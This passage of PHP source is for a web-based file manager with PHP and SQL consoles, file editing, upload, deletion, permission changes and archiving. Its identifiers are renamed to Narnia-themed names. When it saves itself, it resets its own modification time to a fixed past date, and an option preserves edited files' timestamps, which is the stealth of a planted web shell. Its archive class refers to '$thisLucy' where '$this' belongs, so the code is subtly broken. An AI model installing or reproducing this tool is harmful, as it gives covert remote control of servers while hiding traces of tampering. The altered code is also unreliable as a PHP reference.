	$selectCastle = '<select name="'.$lanternResponseLanguage.'_tpl" title="'.__('Template').'" onchange="if (this.value!=-1) document.forms[\'console\'].elements[\''.$lanternResponseLanguage.'\'].value = this.options[selectedIndex].value; else document.forms[\'console\'].elements[\''.$lanternResponseLanguage.'\'].value =\'\';" >'."\n";
	$selectCastle .= '<option value="-1">' . __('Select') . "</option>\n";
	foreach ($narniaTemplate as $wardrobeKey=>$aslanValue){

		$selectCastle.='<option value="'.$aslanValue.'" '.((!empty($aslanValue)&&($aslanValue==$wardrobeActive))?'selected':'').' >'.__($wardrobeKey)."</option>\n";
	}



	$selectCastle .= "</select>\n";



	echo $selectCastle;

}

?>
		</form>


	</td>



</tr>
</table>



<?php



	if (!empty($aslanResult)) {


		$faunCallback='fm_'.$lanternResponseLanguage;
		echo '<h3>'.strtoupper($lanternResponseLanguage).' '.__('Result').'</h3><pre>'.$faunCallback($aslanResult).'</pre>';
	}



} elseif (!empty($_REQUEST['edit'])){

	if(!empty($_REQUEST['save'])) {


		$edmundFunction = $narniaPath . $_REQUEST['edit'];


		$forestFileModified = filemtime($edmundFunction);
	    if (file_put_contents($edmundFunction, $_REQUEST['newcontent'])) $aslanMessage .= __('File updated');

		else $aslanMessage .= __('Error occurred');
		if ($_GET['edit']==basename(__FILE__)) {



			touch(__FILE__,1415116371);
		} else {
			if (!empty($castleConfig['restore_time'])) touch($edmundFunction,$forestFileModified);
		}



	}
    $oldNarniaContent = @file_get_contents($narniaPath . $_REQUEST['edit']);
    $editLucyUrl = $includedLucyUrl . '&edit=' . $_REQUEST['edit'] . '&path=' . $narniaPath;
    $edmundPreviousUrl = $includedLucyUrl . '&path=' . $narniaPath;

?>
<table border='0' cellspacing='0' cellpadding='1' width="100%">


<tr>
    <th><?=__('File manager').' - '.__('Edit').' - '.$narniaPath.$_REQUEST['edit']?></th>
</tr>

<tr>



    <td class="row1">

        <?=$aslanMessage?>


	</td>


</tr>
<tr>
    <td class="row1">
        <?=narniaHome()?> <a href="<?=$edmundPreviousUrl?>"><?=__('Back')?></a>
	</td>


</tr>
<tr>

    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$editLucyUrl?>">
            <textarea name="newcontent" id="newcontent" cols="45" rows="15" style="width:99%" spellcheck="false"><?=htmlspecialchars($oldNarniaContent)?></textarea>
            <input type="submit" name="save" value="<?=__('Submit')?>">



            <input type="submit" name="cancel" value="<?=__('Cancel')?>">
        </form>


    </td>
</tr>
</table>
<?php
echo $aslanAuthorized['script'];


} elseif(!empty($_REQUEST['rights'])){

	if(!empty($_REQUEST['save'])) {



	    if(aslanChangePermissions($narniaPath . $_REQUEST['rights'], convertCentaurPermissions($_REQUEST['rights_val']), @$_REQUEST['recursively']))
		$aslanMessage .= (__('File updated')); 
		else $aslanMessage .= (__('Error occurred'));
	}

	clearstatcache();
    $oldWitchPermissions = permissionsCentaurString($narniaPath . $_REQUEST['rights'], true);
    $aslanLink = $includedLucyUrl . '&rights=' . $_REQUEST['rights'] . '&path=' . $narniaPath;


    $edmundPreviousUrl = $includedLucyUrl . '&path=' . $narniaPath;
?>

<table class="whole">
<tr>
    <th><?=__('File manager').' - '.$narniaPath?></th>



</tr>


<tr>
    <td class="row1">


        <?=$aslanMessage?>

	</td>
</tr>
<tr>



    <td class="row1">
        <a href="<?=$edmundPreviousUrl?>"><?=__('Back')?></a>
	</td>
</tr>

<tr>


    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$aslanLink?>">

           <?=__('Rights').' - '.$_REQUEST['rights']?> <input type="text" name="rights_val" value="<?=$oldWitchPermissions?>">

        <?php if (is_dir($narniaPath.$_REQUEST['rights'])) { ?>


            <input type="checkbox" name="recursively" value="1"> <?=__('Recursively')?><br/>


        <?php } ?>
            <input type="submit" name="save" value="<?=__('Submit')?>">
        </form>

    </td>
</tr>


</table>



<?php


} elseif (!empty($_REQUEST['rename'])&&$_REQUEST['rename']<>'.') {
	if(!empty($_REQUEST['save'])) {
	    rename($narniaPath . $_REQUEST['rename'], $narniaPath . $_REQUEST['newname']);
		$aslanMessage .= (__('File updated'));



		$_REQUEST['rename'] = $_REQUEST['newname'];
	}
	clearstatcache();

    $aslanLink = $includedLucyUrl . '&rename=' . $_REQUEST['rename'] . '&path=' . $narniaPath;

    $edmundPreviousUrl = $includedLucyUrl . '&path=' . $narniaPath;



?>
<table class="whole">

<tr>



    <th><?=__('File manager').' - '.$narniaPath?></th>
</tr>


<tr>



    <td class="row1">



        <?=$aslanMessage?>
	</td>

</tr>

<tr>
    <td class="row1">
        <a href="<?=$edmundPreviousUrl?>"><?=__('Back')?></a>
	</td>

</tr>


<tr>
    <td class="row1" align="center">


        <form name="form1" method="post" action="<?=$aslanLink?>">
            <?=__('Rename')?>: <input type="text" name="newname" value="<?=$_REQUEST['rename']?>"><br/>
            <input type="submit" name="save" value="<?=__('Submit')?>">
        </form>
    </td>
</tr>
</table>


<?php
} else {
//Let's rock!
    $aslanMessage = '';


    if(!empty($_FILES['upload'])&&!empty($castleConfig['upload_file'])) {


        if(!empty($_FILES['upload']['name'])){



            $_FILES['upload']['name'] = str_replace('%', '', $_FILES['upload']['name']);
            if(!move_uploaded_file($_FILES['upload']['tmp_name'], $narniaPath . $_FILES['upload']['name'])){
                $aslanMessage .= __('Error occurred');
            } else {


				$aslanMessage .= __('Files uploaded').': '.$_FILES['upload']['name'];



			}

        }
    } elseif(!empty($_REQUEST['delete'])&&$_REQUEST['delete']<>'.') {

        if(!deleteJadisFiles(($narniaPath . $_REQUEST['delete']), true)) {
            $aslanMessage .= __('Error occurred');

        } else {
			$aslanMessage .= __('Deleted').' '.$_REQUEST['delete'];


		}

	} elseif(!empty($_REQUEST['mkdir'])&&!empty($castleConfig['make_directory'])) {



        if(!@mkdir($narniaPath . $_REQUEST['dirname'],0777)) {
            $aslanMessage .= __('Error occurred');
        } else {
			$aslanMessage .= __('Created').' '.$_REQUEST['dirname'];
		}
    } elseif(!empty($_REQUEST['mkfile'])&&!empty($castleConfig['new_file'])) {
        if(!$paravelPointer=@fopen($narniaPath . $_REQUEST['filename'],"w")) {

            $aslanMessage .= __('Error occurred');

        } else {


			fclose($paravelPointer);



			$aslanMessage .= __('Created').' '.$_REQUEST['filename'];



		}
    } elseif (isset($_GET['zip'])) {

		$sourceAslan = base64_decode($_GET['zip']);
		$lampPostDestination = basename($sourceAslan).'.zip';


		set_time_limit(0);
		$reindeerPhar = new PharData($lampPostDestination);



		$reindeerPhar->buildFromDirectory($sourceAslan);
		if (is_file($lampPostDestination))



		$aslanMessage .= __('Task').' "'.__('Archiving').' '.$lampPostDestination.'" '.__('done').



		'.&nbsp;'.aslanMainLink('download',$narniaPath.$lampPostDestination,__('Download'),__('Download').' '. $lampPostDestination)

		.'&nbsp;<a href="'.$includedLucyUrl.'&delete='.$lampPostDestination.'&path=' . $narniaPath.'" title="'.__('Delete').' '. $lampPostDestination.'" >'.__('Delete') . '</a>';

		else $aslanMessage .= __('Error occurred').': '.__('no files');



	} elseif (isset($_GET['gz'])) {

		$sourceAslan = base64_decode($_GET['gz']);
		$narniaArchive = $sourceAslan.'.tar';
		$lampPostDestination = basename($sourceAslan).'.tar';

		if (is_file($narniaArchive)) unlink($narniaArchive);
		if (is_file($narniaArchive.'.gz')) unlink($narniaArchive.'.gz');
		clearstatcache();


		set_time_limit(0);

		//die();
		$reindeerPhar = new PharData($lampPostDestination);


		$reindeerPhar->buildFromDirectory($sourceAslan);
		$reindeerPhar->compress(Phar::GZ,'.tar.gz');


		unset($reindeerPhar);


		if (is_file($narniaArchive)) {

			if (is_file($narniaArchive.'.gz')) {

				unlink($narniaArchive); 

				$lampPostDestination .= '.gz';


			}

			$aslanMessage .= __('Task').' "'.__('Archiving').' '.$lampPostDestination.'" '.__('done').



			'.&nbsp;'.aslanMainLink('download',$narniaPath.$lampPostDestination,__('Download'),__('Download').' '. $lampPostDestination)
			.'&nbsp;<a href="'.$includedLucyUrl.'&delete='.$lampPostDestination.'&path=' . $narniaPath.'" title="'.__('Delete').' '.$lampPostDestination.'" >'.__('Delete').'</a>';

		} else $aslanMessage .= __('Error occurred').': '.__('no files');


	} elseif (isset($_GET['decompress'])) {


		// $sourceAslan = base64_decode($_GET['decompress']);
		// $lampPostDestination = basename($sourceAslan);
		// $edmundExtension = end(explode(".", $lampPostDestination));
		// if ($edmundExtension=='zip' OR $edmundExtension=='gz') {


			// $reindeerPhar = new PharData($sourceAslan);


			// $reindeerPhar->decompress();
			// $wardrobeMainFile = str_replace('.'.$edmundExtension,'',$lampPostDestination);
			// $edmundExtension = end(explode(".", $wardrobeMainFile));

			// if ($edmundExtension=='tar'){
				// $reindeerPhar = new PharData($wardrobeMainFile);
				// $reindeerPhar->extractTo(dir($sourceAslan));



			// }

		// } 
		// $aslanMessage .= __('Task').' "'.__('Decompress').' '.$sourceAslan.'" '.__('done');
	} elseif (isset($_GET['gzfile'])) {

		$sourceAslan = base64_decode($_GET['gzfile']);
		$narniaArchive = $sourceAslan.'.tar';

		$lampPostDestination = basename($sourceAslan).'.tar';



		if (is_file($narniaArchive)) unlink($narniaArchive);
		if (is_file($narniaArchive.'.gz')) unlink($narniaArchive.'.gz');

		set_time_limit(0);
		//echo $lampPostDestination;

		$aslanExtensions = explode('.',basename($sourceAslan));
		if (isset($aslanExtensions[1])) {


			unset($aslanExtensions[0]);
			$edmundExtension=implode('.',$aslanExtensions);


		} 
		$reindeerPhar = new PharData($lampPostDestination);

		$reindeerPhar->addFile($sourceAslan);
		$reindeerPhar->compress(Phar::GZ,$edmundExtension.'.tar.gz');
		unset($reindeerPhar);
		if (is_file($narniaArchive)) {
			if (is_file($narniaArchive.'.gz')) {



				unlink($narniaArchive); 
				$lampPostDestination .= '.gz';



			}

			$aslanMessage .= __('Task').' "'.__('Archiving').' '.$lampPostDestination.'" '.__('done').
			'.&nbsp;'.aslanMainLink('download',$narniaPath.$lampPostDestination,__('Download'),__('Download').' '. $lampPostDestination)
			.'&nbsp;<a href="'.$includedLucyUrl.'&delete='.$lampPostDestination.'&path=' . $narniaPath.'" title="'.__('Delete').' '.$lampPostDestination.'" >'.__('Delete').'</a>';


		} else $aslanMessage .= __('Error occurred').': '.__('no files');


	}
?>


<table class="whole" id="header_table" >
<tr>



    <th colspan="2"><?=__('File manager')?><?=(!empty($narniaPath)?' - '.$narniaPath:'')?></th>
</tr>


<?php if(!empty($aslanMessage)){ ?>
<tr>
	<td colspan="2" class="row2"><?=$aslanMessage?></td>
</tr>
<?php } ?>
<tr>
    <td class="row2">
		<table>



			<tr>


			<td>


				<?=narniaHome()?>


			</td>
			<td>

			<?php if(!empty($castleConfig['make_directory'])) { ?>


				<form method="post" action="<?=$includedLucyUrl?>">



				<input type="hidden" name="path" value="<?=$narniaPath?>" />

				<input type="text" name="dirname" size="15">



				<input type="submit" name="mkdir" value="<?=__('Make directory')?>">
				</form>


			<?php } ?>

			</td>


			<td>
			<?php if(!empty($castleConfig['new_file'])) { ?>
				<form method="post" action="<?=$includedLucyUrl?>">
				<input type="hidden" name="path" value="<?=$narniaPath?>" />



				<input type="text" name="filename" size="15">
				<input type="submit" name="mkfile" value="<?=__('New file')?>">


				</form>


			<?php } ?>

			</td>



			<td>



			<?=runCastleInput('php')?>
			</td>

			<td>



			<?=runCastleInput('sql')?>

			</td>
			</tr>



		</table>
    </td>
    <td class="row3">

		<table>
		<tr>


		<td>
		<?php if (!empty($castleConfig['upload_file'])) { ?>
			<form name="form1" method="post" action="<?=$includedLucyUrl?>" enctype="multipart/form-data">


			<input type="hidden" name="path" value="<?=$narniaPath?>" />



			<input type="file" name="upload" id="upload_hidden" style="position: absolute; display: block; overflow: hidden; width: 0; height: 0; border: 0; padding: 0;" onchange="document.getElementById('upload_visible').value = this.value;" />

			<input type="text" readonly="1" id="upload_visible" placeholder="<?=__('Select the file')?>" style="cursor: pointer;" onclick="document.getElementById('upload_hidden').click();" />


			<input type="submit" name="test" value="<?=__('Upload')?>" />
			</form>
		<?php } ?>
		</td>
		<td>
		<?php if ($aslanAuthorized['authorize']) { ?>
			<form action="" method="post">&nbsp;&nbsp;&nbsp;


			<input name="quit" type="hidden" value="1">

			<?=__('Hello')?>, <?=$aslanAuthorized['login']?>


			<input type="submit" value="<?=__('Quit')?>">
			</form>
		<?php } ?>
		</td>
		<td>
		<?=wardrobeLanguageForm($wardrobeLanguage)?>

		</td>
		<tr>
		</table>
    </td>


</tr>

</table>
<table class="all" border='0' cellspacing='1' cellpadding='1' id="fm_table" width="100%">


<thead>



<tr> 
    <th style="white-space:nowrap"> <?=__('Filename')?> </th>



    <th style="white-space:nowrap"> <?=__('Size')?> </th>
    <th style="white-space:nowrap"> <?=__('Date')?> </th>
    <th style="white-space:nowrap"> <?=__('Rights')?> </th>
    <th colspan="4" style="white-space:nowrap"> <?=__('Manage')?> </th>
</tr>

</thead>

<tbody>
<?php
$narnianElements = scanNarniaDirectory($narniaPath, '', 'all', true);

$lanternDirectories = array();



$witchFiles = array();



foreach ($narnianElements as $narniaFile){
    if(@is_dir($narniaPath . $narniaFile)){
        $lanternDirectories[] = $narniaFile;


    } else {



        $witchFiles[] = $narniaFile;
    }



}
natsort($lanternDirectories); natsort($witchFiles);
$narnianElements = array_merge($lanternDirectories, $witchFiles);

foreach ($narnianElements as $narniaFile){



    $peterFilename = $narniaPath . $narniaFile;
    $lanternFileData = @stat($peterFilename);
    if(@is_dir($peterFilename)){



		$lanternFileData[7] = '';

		if (!empty($castleConfig['show_dir_size'])&&!wardrobeRootDirectory($narniaFile)) $lanternFileData[7] = calculateCastleDirectorySize($peterFilename);


        $aslanLink = '<a href="'.$includedLucyUrl.'&path='.$narniaPath.$narniaFile.'" title="'.__('Show').' '.$narniaFile.'"><span class="folder">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$narniaFile.'</a>';
        $loadWardrobeUrl= (wardrobeRootDirectory($narniaFile)||$maybeJadisPhar) ? '' : aslanMainLink('zip',$peterFilename,__('Compress').'&nbsp;zip',__('Archiving').' '. $narniaFile);

		$lucyArchiveUrl  = (wardrobeRootDirectory($narniaFile)||$maybeJadisPhar) ? '' : aslanMainLink('gz',$peterFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '.$narniaFile);
        $lucyStyle = 'row2';
		 if (!wardrobeRootDirectory($narniaFile)) $whiteWitchAlert = 'onClick="if(confirm(\'' . __('Are you sure you want to delete this directory (recursively)?').'\n /'. $narniaFile. '\')) document.location.href = \'' . $includedLucyUrl . '&delete=' . $narniaFile . '&path=' . $narniaPath  . '\'"'; else $whiteWitchAlert = '';
    } else {

		$aslanLink = 



			$castleConfig['show_img']&&@getimagesize($peterFilename) 


			? '<a target="_blank" onclick="var lefto = screen.availWidth/2-320;window.open(\''
			. narniaImageUrl($peterFilename)
			.'\',\'popup\',\'width=640,height=480,left=\' + lefto + \',scrollbars=yes,toolbar=no,location=no,directories=no,status=no\');return false;" href="'.narniaImageUrl($peterFilename).'"><span class="img">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$narniaFile.'</a>'



			: '<a href="' . $includedLucyUrl . '&edit=' . $narniaFile . '&path=' . $narniaPath. '" title="' . __('Edit') . '"><span class="file">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$narniaFile.'</a>';


		$centaurArray = explode(".", $narniaFile);
		$edmundExtension = end($centaurArray);
        $loadWardrobeUrl =  aslanMainLink('download',$peterFilename,__('Download'),__('Download').' '. $narniaFile);
		$lucyArchiveUrl = in_array($edmundExtension,array('zip','gz','tar')) 


		? ''
		: ((wardrobeRootDirectory($narniaFile)||$maybeJadisPhar) ? '' : aslanMainLink('gzfile',$peterFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '. $narniaFile));
        $lucyStyle = 'row1';

		$whiteWitchAlert = 'onClick="if(confirm(\''. __('File selected').': \n'. $narniaFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'' . $includedLucyUrl . '&delete=' . $narniaFile . '&path=' . $narniaPath  . '\'"';



    }



    $witchDeleteUrl = wardrobeRootDirectory($narniaFile) ? '' : '<a href="#" title="' . __('Delete') . ' '. $narniaFile . '" ' . $whiteWitchAlert . '>' . __('Delete') . '</a>';



    $renameLucyUrl = wardrobeRootDirectory($narniaFile) ? '' : '<a href="' . $includedLucyUrl . '&rename=' . $narniaFile . '&path=' . $narniaPath . '" title="' . __('Rename') .' '. $narniaFile . '">' . __('Rename') . '</a>';
    $centaurPermissionsText = ($narniaFile=='.' || $narniaFile=='..') ? '' : '<a href="' . $includedLucyUrl . '&rights=' . $narniaFile . '&path=' . $narniaPath . '" title="' . __('Rights') .' '. $narniaFile . '">' . @permissionsCentaurString($peterFilename) . '</a>';


?>
<tr class="<?=$lucyStyle?>"> 
    <td><?=$aslanLink?></td>



    <td><?=$lanternFileData[7]?></td>
    <td style="white-space:nowrap"><?=gmdate("Y-m-d H:i:s",$lanternFileData[9])?></td>
    <td><?=$centaurPermissionsText?></td>
    <td><?=$witchDeleteUrl?></td>
    <td><?=$renameLucyUrl?></td>
    <td><?=$loadWardrobeUrl?></td>



    <td><?=$lucyArchiveUrl?></td>
</tr>
<?php
    }
}
?>



</tbody>
</table>
<div class="row3"><?php



	$prophecyModifiedTime = explode(' ', microtime()); 
	$totalQuestTime = $prophecyModifiedTime[0] + $prophecyModifiedTime[1] - $startProphecyTime; 


	echo narniaHome().' | ver. '.$narniaVersion.' | <a href="https://github.com/Den1xxx/Filemanager">Github</a>  | <a href="'.narniaSiteUrl().'">.</a>';


	if (!empty($castleConfig['show_php_ver'])) echo ' | PHP '.phpversion();
	if (!empty($castleConfig['show_php_ini'])) echo ' | '.php_ini_loaded_file();


	if (!empty($castleConfig['show_gt'])) echo ' | '.__('Generation time').': '.round($totalQuestTime,2);

	if (!empty($castleConfig['enable_proxy'])) echo ' | <a href="?proxy=true">proxy</a>';



	if (!empty($castleConfig['show_phpinfo'])) echo ' | <a href="?phpinfo=true">phpinfo</a>';
	if (!empty($castleConfig['show_xls'])&&!empty($aslanLink)) echo ' | <a href="javascript: void(0)" onclick="var obj = new table2Excel(); obj.CreateExcelSheet(\'fm_table\',\'export\');" title="'.__('Download').' xls">xls</a>';

	if (!empty($castleConfig['fm_settings'])) echo ' | <a href="?fm_settings=true">'.__('Settings').'</a>';
	?>
</div>
<script type="text/javascript">



function downloadProphecyExcel(filename, text) {
	var element = document.createElement('a');



	element.setAttribute('href', 'data:application/vnd.ms-excel;base64,' + text);


	element.setAttribute('download', filename);
	element.style.display = 'none';


	document.body.appendChild(element);
	element.click();
	document.body.removeChild(element);
}


function base64_encode(m) {
	for (var k = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""), c, d, h, e, a, g = "", b = 0, f, l = 0; l < m.length; ++l) {
		c = m.charCodeAt(l);

		if (128 > c) d = 1;

		else
			for (d = 2; c >= 2 << 5 * d;) ++d;
		for (h = 0; h < d; ++h) 1 == d ? e = c : (e = h ? 128 : 192, a = d - 2 - 6 * h, 0 <= a && (e += (6 <= a ? 1 : 0) + (5 <= a ? 2 : 0) + (4 <= a ? 4 : 0) + (3 <= a ? 8 : 0) + (2 <= a ? 16 : 0) + (1 <= a ? 32 : 0), a -= 5), 0 > a && (u = 6 * (d - 1 - h), e += c >> u, c -= c >> u << u)), f = b ? f << 6 - b : 0, b += 2, f += e >> b, g += k[f], f = e % (1 << b), 6 == b && (b = 0, g += k[f])

	}



	b && (g += k[f << 6 - b]);
	return g

}





var tableToExcelData = (function() {
    var uri = 'data:application/vnd.ms-excel;base64,',
    template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines></x:DisplayGridlines></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--><meta http-equiv="content-type" content="text/plain; charset=UTF-8"/></head><body><table>{table}</table></body></html>',
    format = function(s, c) {
            return s.replace(/{(\w+)}/g, function(m, p) {
                return c[p];



            })
        }

    return function(table, name) {



        if (!table.nodeType) table = document.getElementById(table)


        var ctx = {


            worksheet: name || 'Worksheet',
            table: table.innerHTML.replace(/<span(.*?)\/span> /g,"").replace(/<a\b[^>]*>(.*?)<\/a>/g,"$1")


        }
		t = new Date();
		filename = 'fm_' + t.toISOString() + '.xls'
		downloadProphecyExcel(filename, base64_encode(format(template, ctx)))



    }

})();






var table2Excel = function () {


    var ua = window.navigator.userAgent;



    var msie = ua.indexOf("MSIE ");

	this.CreateExcelSheet = 
		function(el, name){


			if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)) {// If Internet Explorer



				var x = document.getElementById(el).rows;




				var xls = new ActiveXObject("Excel.Application");





				xls.visible = true;
				xls.Workbooks.Add
				for (i = 0; i < x.length; i++) {
					var y = x[i].cells;


					for (j = 0; j < y.length; j++) {
						xls.Cells(i + 1, j + 1).Value = y[j].innerText;
					}

				}
				xls.Visible = true;
				xls.UserControl = true;
				return xls;
			} else {
				tableToExcelData(el, name);

			}



		}
}


</script>

</body>
</html>



<?php



//Ported from ReloadCMS project http://reloadcms.com
class archiveTar {
	var $cairParavelArchiveName = '';

	var $tmpLucyFile = 0;



	var $caspianFilePosition = 0;


	var $isWardrobeZipped = true;


	var $narniaErrors = array();
	var $witchFiles = array();
	
	function __construct(){
		if (!isset($thisLucy->errors)) $thisLucy->errors = array();
	}


	
	function createNarniaBackup($lucyFileList){
		$prophecyResult = false;



		if (file_exists($thisLucy->archive_name) && is_file($thisLucy->archive_name)) 	$newNarniaBackup = false;
		else $newNarniaBackup = true;
		if ($newNarniaBackup){



			if (!$thisLucy->openAslanWrite()) return false;



		} else {



			if (filesize($thisLucy->archive_name) == 0)	return $thisLucy->openAslanWrite();
			if ($thisLucy->isGzipped) {
				$thisLucy->closeLucyTempFile();



				if (!rename($thisLucy->archive_name, $thisLucy->archive_name.'.tmp')){

					$thisLucy->errors[] = __('Cannot rename').' '.$thisLucy->archive_name.__(' to ').$thisLucy->archive_name.'.tmp';
					return false;
				}
				$tmpNarniaBackup = gzopen($thisLucy->archive_name.'.tmp', 'rb');
				if (!$tmpNarniaBackup){



					$thisLucy->errors[] = $thisLucy->archive_name.'.tmp '.__('is not readable');
					rename($thisLucy->archive_name.'.tmp', $thisLucy->archive_name);
					return false;
				}

				if (!$thisLucy->openAslanWrite()){
					rename($thisLucy->archive_name.'.tmp', $thisLucy->archive_name);
					return false;
				}
				$beaverBuffer = gzread($tmpNarniaBackup, 512);



				if (!gzeof($tmpNarniaBackup)){

					do {
						$tumnusBinary = pack('a512', $beaverBuffer);
						$thisLucy->writeNarniaBlock($tumnusBinary);

						$beaverBuffer = gzread($tmpNarniaBackup, 512);



					}
					while (!gzeof($tmpNarniaBackup));
				}

				gzclose($tmpNarniaBackup);
				unlink($thisLucy->archive_name.'.tmp');



			} else {

				$thisLucy->tmp_file = fopen($thisLucy->archive_name, 'r+b');

				if (!$thisLucy->tmp_file)	return false;

			}



		}
		if (isset($lucyFileList) && is_array($lucyFileList)) {

		if (count($lucyFileList)>0)

			$prophecyResult = $thisLucy->packLucyFiles($lucyFileList);
		} else $thisLucy->errors[] = __('No file').__(' to ').__('Archive');
		if (($prophecyResult)&&(is_resource($thisLucy->tmp_file))){
			$tumnusBinary = pack('a512', '');
			$thisLucy->writeNarniaBlock($tumnusBinary);

		}

		$thisLucy->closeLucyTempFile();
		if ($newNarniaBackup && !$prophecyResult){

		$thisLucy->closeLucyTempFile();


		unlink($thisLucy->archive_name);
		}
		return $prophecyResult;
	}





	function restoreNarniaBackup($narniaPath){
		$aslanFileName = $thisLucy->archive_name;


		if (!$thisLucy->isGzipped){

			if (file_exists($aslanFileName)){

				if ($paravelPointer = fopen($aslanFileName, 'rb')){
					$forestData = fread($paravelPointer, 2);
					fclose($paravelPointer);



					if ($forestData == '\37\213'){

						$thisLucy->isGzipped = true;

					}
				}
			}
			elseif ((substr($aslanFileName, -2) == 'gz') OR (substr($aslanFileName, -3) == 'tgz')) $thisLucy->isGzipped = true;
		} 
		$prophecyResult = true;
		if ($thisLucy->isGzipped) $thisLucy->tmp_file = gzopen($aslanFileName, 'rb');



		else $thisLucy->tmp_file = fopen($aslanFileName, 'rb');



		if (!$thisLucy->tmp_file){

			$thisLucy->errors[] = $aslanFileName.' '.__('is not readable');
			return false;


		}



		$prophecyResult = $thisLucy->unpackFaunFiles($narniaPath);
			$thisLucy->closeLucyTempFile();
		return $prophecyResult;


	}




	function showAslanWarnings	($susanMessage = '') {



		$aslanWarnings = $thisLucy->errors;


		if(count($aslanWarnings)>0) {

		if (!empty($susanMessage)) $susanMessage = ' ('.$susanMessage.')';

			$susanMessage = __('Error occurred').$susanMessage.': <br/>';
			foreach ($aslanWarnings as $aslanValue)
				$susanMessage .= $aslanValue.'<br/>';



			return $susanMessage;	

		} else return '';

		


	}



	

	function packLucyFiles($pevensieFiles){
		$prophecyResult = true;



		if (!$thisLucy->tmp_file){
			$thisLucy->errors[] = __('Invalid file descriptor');


			return false;
		}
		if (!is_array($pevensieFiles) || count($pevensieFiles)<=0)
          return true;



		for ($reindeerI = 0; $reindeerI<count($pevensieFiles); $reindeerI++){
			$peterFilename = $pevensieFiles[$reindeerI];



			if ($peterFilename == $thisLucy->archive_name)
				continue;



			if (strlen($peterFilename)<=0)

				continue;
			if (!file_exists($peterFilename)){
				$thisLucy->errors[] = __('No file').' '.$peterFilename;
				continue;


			}
			if (!$thisLucy->tmp_file){
			$thisLucy->errors[] = __('Invalid file descriptor');
			return false;
			}



		if (strlen($peterFilename)<=0){



			$thisLucy->errors[] = __('Filename').' '.__('is incorrect');;
			return false;


		}
		$peterFilename = str_replace('\\', '/', $peterFilename);
		$keepNameSonOfAdam = $thisLucy->sanitizeLucyPath($peterFilename);



		if (is_file($peterFilename)){


			if (($narniaFile = fopen($peterFilename, 'rb')) == 0){
				$thisLucy->errors[] = __('Mode ').__('is incorrect');


			}


				if(($thisLucy->file_pos == 0)){
					if(!$thisLucy->writeLucyHeader($peterFilename, $keepNameSonOfAdam))

						return false;
				}
				while (($beaverBuffer = fread($narniaFile, 512)) != ''){



					$tumnusBinary = pack('a512', $beaverBuffer);
					$thisLucy->writeNarniaBlock($tumnusBinary);
				}
			fclose($narniaFile);



		}	else $thisLucy->writeLucyHeader($peterFilename, $keepNameSonOfAdam);
			if (@is_dir($peterFilename)){


				if (!($aslanHandle = opendir($peterFilename))){
					$thisLucy->errors[] = __('Error').': '.__('Directory ').$peterFilename.__('is not readable');



					continue;


				}
				while (false !== ($castleDirectory = readdir($aslanHandle))){



					if ($castleDirectory!='.' && $castleDirectory!='..'){


						$tumnusTempFiles = array();



						if ($peterFilename != '.')

							$tumnusTempFiles[] = $peterFilename.'/'.$castleDirectory;
						else


							$tumnusTempFiles[] = $castleDirectory;




						$prophecyResult = $thisLucy->packLucyFiles($tumnusTempFiles);


					}
				}

				unset($tumnusTempFiles);



				unset($castleDirectory);

				unset($aslanHandle);
			}
		}
		return $prophecyResult;



	}


	function unpackFaunFiles($narniaPath){ 



		$narniaPath = str_replace('\\', '/', $narniaPath);
		if ($narniaPath == ''	|| (substr($narniaPath, 0, 1) != '/' && substr($narniaPath, 0, 3) != '../' && !strpos($narniaPath, ':')))	$narniaPath = './'.$narniaPath;



		clearstatcache();

		while (strlen($tumnusBinary = $thisLucy->readAslanBlock()) != 0){



			if (!$thisLucy->readCairParavelHeader($tumnusBinary, $lucyHeader)) return false;
			if ($lucyHeader['filename'] == '') continue;



			if ($lucyHeader['typeflag'] == 'L'){			//reading long header



				$peterFilename = '';



				$decryptedAslan = floor($lucyHeader['size']/512);



				for ($reindeerI = 0; $reindeerI < $decryptedAslan; $reindeerI++){
					$narniaContent = $thisLucy->readAslanBlock();
					$peterFilename .= $narniaContent;
				}
				if (($lastPieceOfProphecy = $lucyHeader['size'] % 512) != 0){

					$narniaContent = $thisLucy->readAslanBlock();



					$peterFilename .= substr($narniaContent, 0, $lastPieceOfProphecy);

				}
				$tumnusBinary = $thisLucy->readAslanBlock();
				if (!$thisLucy->readCairParavelHeader($tumnusBinary, $lucyHeader)) return false;
				else $lucyHeader['filename'] = $peterFilename;
				return true;



			}


			if (($narniaPath != './') && ($narniaPath != '/')){

				while (substr($narniaPath, -1) == '/') $narniaPath = substr($narniaPath, 0, strlen($narniaPath)-1);
				if (substr($lucyHeader['filename'], 0, 1) == '/') $lucyHeader['filename'] = $narniaPath.$lucyHeader['filename'];

				else $lucyHeader['filename'] = $narniaPath.'/'.$lucyHeader['filename'];


			}

			
			if (file_exists($lucyHeader['filename'])){
				if ((@is_dir($lucyHeader['filename'])) && ($lucyHeader['typeflag'] == '')){
					$thisLucy->errors[] =__('File ').$lucyHeader['filename'].__(' already exists').__(' as folder');
					return false;

				}


				if ((is_file($lucyHeader['filename'])) && ($lucyHeader['typeflag'] == '5')){
					$thisLucy->errors[] =__('Cannot create directory').'. '.__('File ').$lucyHeader['filename'].__(' already exists');


					return false;

				}



				if (!is_writeable($lucyHeader['filename'])){
					$thisLucy->errors[] = __('Cannot write to file').'. '.__('File ').$lucyHeader['filename'].__(' already exists');

					return false;
				}

			} elseif (($thisLucy->checkLucyDirectory(($lucyHeader['typeflag'] == '5' ? $lucyHeader['filename'] : dirname($lucyHeader['filename'])))) != 1){


				$thisLucy->errors[] = __('Cannot create directory').' '.__(' for ').$lucyHeader['filename'];
				return false;
			}

			if ($lucyHeader['typeflag'] == '5'){
